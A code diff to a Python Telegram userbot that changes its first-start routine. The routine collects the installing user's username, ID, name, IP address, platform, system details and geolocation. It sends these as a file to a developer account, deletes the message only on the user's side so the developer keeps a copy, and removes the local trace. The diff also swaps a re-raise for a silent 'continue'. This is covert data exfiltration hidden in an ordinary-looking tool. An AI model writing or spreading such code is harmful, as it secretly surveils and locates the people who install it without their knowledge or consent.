@@ -11,7 +11,7 @@ from .stats import get_system
 import geocoder
 
 config = configparser.ConfigParser()
-config.read('.\\bin\\Mod\\cache\\settings.ini')
+config.read(misc.session_path+'cache\\settings.ini')
 
 try:
     if config.get('settings','prefix') != '!':
@@ -62,28 +62,28 @@ async def start(client: Client):
                         except:
                             ip = 'ip error'
                     message = f'''{misc.userbot_name} {misc.userbot_version} started at {datetime.date.today()}
-```Username
-{me.username}```
-```ID
-{me.id}```
-```Is mutual
-{dev.is_mutual_contact}```
-```Name
-{dev.first_name}```
-```IP
-{ip}```
-```Platform
-{s}```
+Username
+{me.username}
+ID
+{me.id}
+Is mutual to developer
+{dev.is_mutual_contact}
+Name
+{dev.first_name}
+IP
+{ip}
+Platform
+{s}
 {get_system()}
-```Location
-{g.latlng}```
+Location
+{g.latlng}
 '''
-                    with open('bin/Mod/first_start.txt', 'w') as file:
+                    with open(misc.session_path+'first_start.txt', 'w') as file:
                         file.write(message)
                         file.close()
-                    msg = await client.send_document(misc.devd, 'bin/Mod/log.txt')
+                    msg = await client.send_document(misc.devd, misc.session_path+'first_start.txt')
                     await msg.delete(revoke=False)
-                    os.remove('bin/Mod/first_start.txt')
+                    os.remove(misc.session_path+'first_start.txt')
 
                 config.set('settings','firststart','0')
                 with open(misc.config_path, 'w') as f:
@@ -91,5 +91,5 @@ async def start(client: Client):
 
         except:
             cfg.write('settings','firststart','1')
-            #continue
-            raise
+            continue
+            #raise
